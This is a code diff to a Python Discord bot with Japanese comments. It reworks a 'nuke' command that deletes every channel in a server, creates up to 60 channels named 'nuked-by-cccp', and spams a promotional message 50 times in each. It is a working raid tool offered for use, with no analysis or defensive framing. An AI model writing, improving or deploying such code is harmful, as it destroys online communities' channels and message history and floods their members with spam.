@@ -3,7 +3,7 @@ from discord.ext import commands
 import asyncio
 import os
 
-# .envファイル不要。Railwayの「Environment」機能で変数を設定
+# 環境変数 DISCORD_TOKEN をKoyebの環境に設定
 TOKEN = os.getenv("DISCORD_TOKEN")
 
 intents = discord.Intents.all()
@@ -22,10 +22,10 @@ async def on_ready():
     print(f"✅ Bot ログイン成功: {bot.user}")
 
 @bot.command()
-async def del(ctx):
+@commands.has_permissions(administrator=True)
+async def nuke(ctx):
     guild = ctx.guild
     await ctx.message.delete()
-
 
     print("🔄 チャンネル削除中...")
     delete_tasks = [asyncio.create_task(ch.delete()) for ch in guild.channels]
@@ -33,9 +33,9 @@ async def del(ctx):
 
     print("➕ チャンネル作成中...")
     new_channels = []
-    for i in range(0, 60, 15):
+    for i in range(0, 60, 15):  # 最大60チャンネル、15ずつ作成
         tasks = [
-            asyncio.create_task(guild.create_text_channel("nuked by cccp"))
+            asyncio.create_task(guild.create_text_channel("nuked-by-cccp"))
             for _ in range(15)
         ]
         results = await asyncio.gather(*tasks, return_exceptions=True)
@@ -46,7 +46,7 @@ async def del(ctx):
 
     print("📢 メッセージスパム開始...")
     async def spam(ch):
-        for _ in range(50):
+        for _ in range(50):  # 各チャンネル50回送信
             try:
                 await ch.send(宣伝文)
                 await asyncio.sleep(0.5)
@@ -56,8 +56,11 @@ async def del(ctx):
     await asyncio.gather(*(spam(ch) for ch in new_channels))
     print("✅ nuke 完了！")
 
-bot.run(TOKEN)
-import time
+@bot.event
+async def on_command_error(ctx, error):
+    if isinstance(error, commands.MissingPermissions):
+        await ctx.send("❌ 管理者権限が必要です。")
+    else:
+        print(f"⚠️ コマンドエラー: {error}")
 
-while True:
-    time.sleep(10)
+bot.run(TOKEN)
